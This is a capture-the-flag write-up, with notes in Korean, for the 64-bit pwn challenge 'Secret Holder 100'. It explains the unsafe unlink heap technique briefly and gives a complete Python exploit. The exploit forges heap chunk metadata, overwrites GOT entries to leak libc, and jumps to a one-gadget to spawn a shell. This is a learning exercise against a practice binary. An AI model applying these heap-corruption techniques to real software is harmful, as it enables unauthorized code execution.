Secret Holder 100 (pwn)
=============

### 1. Introduction

| RELRO         | STACK CANARY | NX         | PIE    | RPATH    | RUNPATH    | FILE   |
|---------------|--------------|------------|--------|----------|------------|--------|
| Partial RELRO | Canary found | NX enabled | No PIE | No RPATH | No RUNPATH | secret | 

64 bit binary이며 unsafe unlink에 대해 다시한번 공부할 수 있는 계기가 되었다.
unsafe unlink는 Free된 smallbin chunk의 prev_size와 size를 조작할 수 있고 그위 몇바이트만 바꿀 수 있으면 트리거할 수 있다.
꼭 smallbin 두개가 연속하여 있지 않아도 되며 heap overflow만 발생시키면 가능하다는것을 새겨두어야겠다.

### 2. Exploit
```python
from ntpwn import *

s = process('./secret')
e = ELF('./secret')
l = ELF("/lib/x86_64-linux-gnu/libc.so.6")
b = BP(s)
b.bp('tracemalloc on')
b.bp('c')
b.done()

def keep(size,secret):
    s.sendlineafter('3. Renew secret\n','1')
    s.sendlineafter('Big secret\n', size)
    s.sendafter('l me your secret:',secret)

def wipe(size):
    s.sendlineafter('3. Renew secret\n','2')
    s.sendlineafter('Big secret\n', size)

def renew(size,secret):
    s.sendlineafter('3. Renew secret\n','3')
    s.sendlineafter('Big secret\n', size)
    s.sendafter('l me your secret:',secret)
pause()

keep('3','A')  # huge secret -> 0x7f~~
wipe('3')
keep('3','A') # huge secret -> heap
wipe('3')

keep('1','A')
wipe('1')
keep('2','A')
wipe('1')
keep('1','A')
keep('3','A')

bss = 0x6020b0

renew('2',p64(0x0) + p64(0x21) + p64(bss-0x18) + p64(bss-0x10) + p64(0x20) + p64(0x61a90))
wipe('3')

renew('1',p64(0) + p64(e.got['free']))
renew('2',p64(e.plt['puts']))
renew('1',p64(0) + p64(e.got['atoi']))
wipe('2')
s.recvuntil('3. Huge secret\n')
libc_base = u64(s.recv(6) + "\x00" * 2) - l.symbols['atoi']
print hex(libc_base)
oneshot = libc_base + 0x4526a

keep('2','A')

renew('1',p64(0) + p64(e.got['atoi']))
renew('2',p64(oneshot))

s.sendlineafter('3. Renew secret\n','NEXTLINE')
s.interactive()
```
